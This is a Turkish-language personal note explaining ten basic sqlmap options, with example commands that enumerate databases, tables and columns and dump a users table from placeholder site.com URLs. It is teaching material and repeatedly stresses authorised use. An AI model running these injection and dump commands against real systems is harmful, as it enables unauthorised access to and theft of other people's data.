====== komutlar ======
Created Friday 21 November 2025

Aşağıda sqlmap için pratikte en çok işine yarayacak 10 temel seçenek/komut ve kısa açıklamaları var.  
(Bunları sadece kendi sistemlerinde veya açıkça yetki aldığın hedeflerde kullanmalısın.)

---

### 1. `-u` / `--url` – Hedef URL’yi belirtmek

**Örnek:**
```bash
python sqlmap.py -u "http://site.com/vuln.php?id=1"
```

**Ne işe yarar?**  
Test edilecek hedef URL’yi belirtirsin. Sqlmap bu URL’deki parametreleri (örneğin `id=1`) SQL injection için otomatik olarak dener.

---

### 2. `--data` – POST verisi ile test yapmak

**Örnek:**
```bash
python sqlmap.py -u "http://site.com/login.php" --data="user=admin&pass=1"
```

**Ne işe yarar?**  
GET yerine POST istekleri kullanılan formlar (login, arama vb.) için gönderilen form verisini (`user`, `pass` gibi) SQL injection açısından test eder.

---

### 3. `--cookie` – Giriş gerektiren sayfaları test etmek

**Örnek:**
```bash
python sqlmap.py -u "http://site.com/panel.php?id=1" \
  --cookie="PHPSESSID=abc123; role=admin"
```

**Ne işe yarar?**  
Oturum açmayı gerektiren sayfaları test etmek için tarayıcıdan aldığın cookie’leri sqlmap’e verirsin. Böylece yetkili kullanıcı gibi istek gönderebilir.

---

### 4. `--dbs` – Tüm veritabanlarını listelemek

**Örnek:**
```bash
python sqlmap.py -u "http://site.com/vuln.php?id=1" --dbs
```

**Ne işe yarar?**  
Hedefteki veritabanı sunucusunda bulunan veritabanı isimlerini (schema’ları) listeler. Sonrasında hangi DB üzerinde çalışacağını seçebilirsin.

---

### 5. `-D` ve `--tables` – Seçili veritabanındaki tabloları listelemek

**Örnek:**
```bash
python sqlmap.py -u "http://site.com/vuln.php?id=1" \
  -D mydatabase --tables
```

**Ne işe yarar?**  
`-D` ile bir veritabanı adı seçersin (`mydatabase` gibi), `--tables` ile bu veritabanındaki tüm tablo isimlerini listelersin.

---

### 6. `-D`, `-T` ve `--columns` – Tablo kolonlarını görmek

**Örnek:**
```bash
python sqlmap.py -u "http://site.com/vuln.php?id=1" \
  -D mydatabase -T users --columns
```

**Ne işe yarar?**  
Belirli bir veritabanı (`-D mydatabase`) ve tablo (`-T users`) içindeki sütun (kolon) isimlerini listeler. Örneğin `id`, `username`, `password` gibi.

---

### 7. `-D`, `-T` ve `--dump` – Tablo içeriğini çekmek

**Örnek:**
```bash
python sqlmap.py -u "http://site.com/vuln.php?id=1" \
  -D mydatabase -T users --dump
```

**Ne işe yarar?**  
Seçtiğin veritabanındaki (`-D`) belirli tablonun (`-T`) içindeki gerçek satır verilerini çeker. Yani kullanıcı kayıtları, loglar vs. Bu kısım **mutlaka** sadece yetkili testlerde kullanılmalı.

---

### 8. `-r` – Kayıtlı HTTP isteği dosyasını kullanmak

**Örnek:**
```bash
python sqlmap.py -r request.txt
```

**Ne işe yarar?**  
Burp Suite, ZAP, tarayıcı eklentisi vb. araçlardan kaydettiğin ham HTTP isteğini (`request.txt`) doğrudan sqlmap’e verirsin. Çok karmaşık header, cookie, token içeren isteklerde hayat kurtarır.

---

### 9. `--batch` – Etkileşimsiz (sormadan) çalışma modu

**Örnek:**
```bash
python sqlmap.py -u "http://site.com/vuln.php?id=1" --dbs --batch
```

**Ne işe yarar?**  
Sqlmap’in komut satırında soru sormadan, tüm sorulara varsayılan cevabı vererek otomatik çalışmasını sağlar. Script’lerde veya uzun taramalarda kullanışlıdır.

---

### 10. `--level` ve `--risk` – Test derinliğini ayarlamak

**Örnek:**
```bash
python sqlmap.py -u "http://site.com/vuln.php?id=1" \
  --level=5 --risk=3
```

**Ne işe yarar?**  
- `--level` (1–5): Daha yüksek seviye, daha fazla parametre ve teknik dener (daha yavaş ama daha kapsamlı).  
- `--risk` (1–3): Daha yüksek risk, daha agresif payload’lar dener (hedef üzerinde etkisi artar).

Genelde ilk denemelerde `--level=2` veya `3` iş görür; risk’i yükseltmeden önce ortamı iyi analiz etmek gerekir.
